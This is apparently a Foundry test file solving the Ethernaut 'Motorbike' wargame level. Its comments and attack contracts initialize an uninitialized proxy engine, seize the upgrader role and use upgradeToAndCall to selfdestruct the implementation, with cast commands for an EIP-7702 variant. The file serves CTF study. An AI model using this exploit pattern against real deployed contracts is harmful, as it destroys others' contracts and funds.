// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity 0.6.12;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Motorbike.sol";

// 1. engine isn't called initialize() yet, and thus calling initialize() to become upgrader
// 2. upgradeToAndCall() points to an address with a selfdestruct() function
//    since delegatecall() is used, upgradeToAndCall() will selfdestruct() engine
// - note that selfdestruct() takes effect at the end of a tx, thus always verify() with another tx

// first approach: post-cancun eip7702, delegating player to the solution contract
// 1. cast send 0x0000000000000000000000000000000000000000 --auth <contract_address>
//    use cast code <MY_ADDRESS> to see if there's bytecode on eoa
// 2. cast send <MY_ADDRESS> "attack(address,address,address)" <ETHERNAUT> <ENGINE> <MOTORBIKE_FACTORY=level>
// 3. cast send <MY_ADDRESS> "verify()" <MOTORBIKE_INSTANCE>
// 4. undelegate: cast send 0x0000000000000000000000000000000000000000 --auth 0x0000000000000000000000000000000000000000
contract EOASolution {
    address ethernaut;

    function attack(address _ethernaut, address _engine, address level) public {
        ethernaut = _ethernaut;
        (bool result, ) = ethernaut.call(
            abi.encodeWithSignature("createLevelInstance(address)", level)
        );
        require(result, "createLevelInstance failed");

        Engine engine = Engine(_engine);
        engine.initialize();
        require(engine.upgrader() == address(this), "initialize() fails");
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(EOASolution.kill.selector)
        );
    }

    function verify(address instance) public {
        (bool result, ) = ethernaut.call(
            abi.encodeWithSignature(
                "submitLevelInstance(address)",
                payable(instance)
            )
        );

        require(result, "call failed");
    }

    function kill() external {
        selfdestruct(address(0));
    }
}

// second approach: contract solution; EOA cannot be registered for completing the level tho
contract ContractSolution {
    address motorbikeFactory;
    address instance;

    function attack(address _motorbikeFactory, address _engine) public {
        motorbikeFactory = _motorbikeFactory;
        (, bytes memory data) = motorbikeFactory.call(
            abi.encodeWithSignature("createInstance(address)", address(this))
        );

        instance = abi.decode(data, (address));

        Engine engine = Engine(_engine);
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(ContractSolution.kill.selector)
        );
    }

    function verify() public {
        (, bytes memory data) = motorbikeFactory.call(
            abi.encodeWithSignature(
                "validateInstance(address,address)",
                payable(instance),
                address(this)
            )
        );

        bool result = abi.decode(data, (bool));
        require(result, "attack failed");
    }

    function kill() external {
        selfdestruct(address(0));
    }
}
contract SelfDesctructor1 {
    function kill() external {
        selfdestruct(address(0));
    }
}

contract SelfDesctructor2 {
    constructor() public {
        selfdestruct(address(0));
    }
}

contract MiddleMan {
    function attack() public returns (address) {
        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));

        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(MiddleMan.kill.selector)
        );
        return address(engine);
    }

    function kill() external {
        selfdestruct(address(0));
    }
}

// this test shows that foundry seems to treat each line as one separate tx
// and only allows selfdestruct() to delete code if it's called in constructor()
// thus, this level cannot be tested and demonstrated with foundry
contract MotorbikeTest is Test {
    function test() public {
        SelfDesctructor1 selfDesctructor1 = new SelfDesctructor1();
        assertEq(isContract(address(selfDesctructor1)), true);

        selfDesctructor1.kill();
        // the next line assertion cannot pass, even with rolling block.number or any other trick
        // assertEq(isContract(address(selfDesctructor1)), false);

        SelfDesctructor2 selfDesctructor2 = new SelfDesctructor2();
        assertEq(isContract(address(selfDesctructor2)), false);

        MiddleMan middleMan = new MiddleMan();
        address engine = middleMan.attack();
        // assertEq(isContract(engine), false);
    }

    function isContract(address _addr) internal view returns (bool) {
        uint256 size;

        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}
